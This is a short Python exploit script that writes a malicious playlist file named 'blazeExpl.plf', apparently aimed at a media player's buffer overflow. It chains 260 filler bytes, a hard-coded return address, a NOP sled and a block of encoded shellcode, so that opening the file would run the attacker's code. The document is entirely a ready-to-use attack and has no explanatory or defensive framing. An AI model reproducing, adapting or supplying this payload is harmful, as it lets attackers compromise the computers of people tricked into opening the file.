from struct import pack
junk ="\x41"*260
junk+="\x77\x4F\xFB\x76"
junk+="\x90"*16               
junk+=("\xd9\xc8\xb8\xa0\x47\xcf\x09\xd9\x74\x24\xf4\x5f\x2b\xc9" +
"\xb1\x32\x31\x47\x17\x83\xc7\x04\x03\xe7\x54\x2d\xfc\x1b" +
"\xb2\x38\xff\xe3\x43\x5b\x89\x06\x72\x49\xed\x43\x27\x5d" +
"\x65\x01\xc4\x16\x2b\xb1\x5f\x5a\xe4\xb6\xe8\xd1\xd2\xf9" +
"\xe9\xd7\xda\x55\x29\x79\xa7\xa7\x7e\x59\x96\x68\x73\x98" +
"\xdf\x94\x7c\xc8\x88\xd3\x2f\xfd\xbd\xa1\xf3\xfc\x11\xae" +
"\x4c\x87\x14\x70\x38\x3d\x16\xa0\x91\x4a\x50\x58\x99\x15" +
"\x41\x59\x4e\x46\xbd\x10\xfb\xbd\x35\xa3\x2d\x8c\xb6\x92" +
"\x11\x43\x89\x1b\x9c\x9d\xcd\x9b\x7f\xe8\x25\xd8\x02\xeb" +
"\xfd\xa3\xd8\x7e\xe0\x03\xaa\xd9\xc0\xb2\x7f\xbf\x83\xb8" +
"\x34\xcb\xcc\xdc\xcb\x18\x67\xd8\x40\x9f\xa8\x69\x12\x84" +
"\x6c\x32\xc0\xa5\x35\x9e\xa7\xda\x26\x46\x17\x7f\x2c\x64" +
"\x4c\xf9\x6f\xe2\x93\x8b\x15\x4b\x93\x93\x15\xfb\xfc\xa2" +
"\x9e\x94\x7b\x3b\x75\xd1\x7a\xca\x44\xcf\xeb\x75\x3d\xb2" +
"\x71\x86\xeb\xf0\x8f\x05\x1e\x88\x6b\x15\x6b\x8d\x30\x91" +
"\x87\xff\x29\x74\xa8\xac\x4a\x5d\xcb\x33\xd9\x3d\x0c"
)  
x=open('blazeExpl.plf', 'w')
x.write(junk)
x.close()  
